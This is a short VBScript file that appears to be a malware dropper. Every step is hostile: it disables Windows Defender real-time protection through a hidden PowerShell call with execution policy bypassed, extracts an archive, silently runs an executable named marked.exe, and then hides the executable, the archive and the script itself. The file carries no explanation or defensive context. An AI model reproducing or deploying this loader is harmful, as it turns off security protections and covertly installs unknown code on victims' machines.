Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0
WScript.Sleep 3000

Set objFSO = CreateObject("Scripting.FileSystemObject")
currentDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
objShell.CurrentDirectory = currentDir

objShell.Run "tar -xvzf main.tar.gz", 0

WScript.Sleep 1000

objShell.Run "marked.exe", 0

WScript.Sleep 1000

objShell.Run "attrib +h marked.exe", 0
objShell.Run "attrib +h main.tar.gz", 0
objShell.Run "attrib +h marked.vbs", 0
